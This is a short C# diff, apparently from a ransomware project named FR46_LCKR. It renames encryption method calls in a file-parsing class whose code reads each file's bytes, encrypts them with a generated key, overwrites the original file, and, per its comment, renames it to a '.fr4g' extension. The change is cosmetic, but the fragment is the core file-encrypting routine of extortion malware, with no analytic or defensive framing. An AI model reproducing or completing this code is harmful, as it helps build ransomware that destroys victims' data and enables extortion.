@@ -11,14 +11,14 @@ namespace FR46_LCKR
         public Fil_Parsr(IFil_Crypt fil_Crypt)
         {
             Fil_Crypt = fil_Crypt;
-            KB = Fil_Crypt.Create_ECrypt_Key();
+            KB = Fil_Crypt.CreateEncryptionKey();
         }
 
         //Parse through files and rename to .fr4g
         public void Par_File(string fPath)
         {
             var fBytes = Get_FBytes(fPath);
-            var encryptedFBytes = Fil_Crypt.ECrypt_Bytes(fBytes, KB);
+            var encryptedFBytes = Fil_Crypt.EncryptBytes(fBytes, KB);
             Wrt_FBytes(fPath, encryptedFBytes);
 
             var fExt = Path.GetExtension(fPath);
